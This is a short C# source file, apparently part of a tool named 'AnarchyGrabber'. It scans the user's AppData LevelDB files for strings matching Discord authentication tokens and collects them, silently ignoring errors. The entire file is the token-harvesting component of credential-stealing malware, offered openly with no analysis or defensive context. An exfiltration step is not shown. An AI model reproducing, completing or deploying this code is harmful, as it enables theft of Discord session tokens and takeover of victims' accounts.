using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace AnarchyGrabber
{
    public static class Grabber
    {
        public static List<string> GetTokens(string ldbDir)
        {
            List<string> tokens = new List<string>();

            try
            {
                DirectoryInfo leveldb = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\" + ldbDir);

                tokens = new List<string>();

                foreach (var file in leveldb.GetFiles("*.ldb"))
                {
                    //looks for discord token patterns (yes my regex is shit shut up)
                    foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), @"\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\.\w\w\w\w\w\w\.\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w"))
                    {
                        if (match.Success)
                            tokens.Add(match.Value);
                    }
                }
            } catch { }

            if (tokens.Count > 0)
                tokens[tokens.Count - 1] += " - NEWEST";
            else
                tokens.Add("No tokens found");

            return tokens;
        }
    }
}
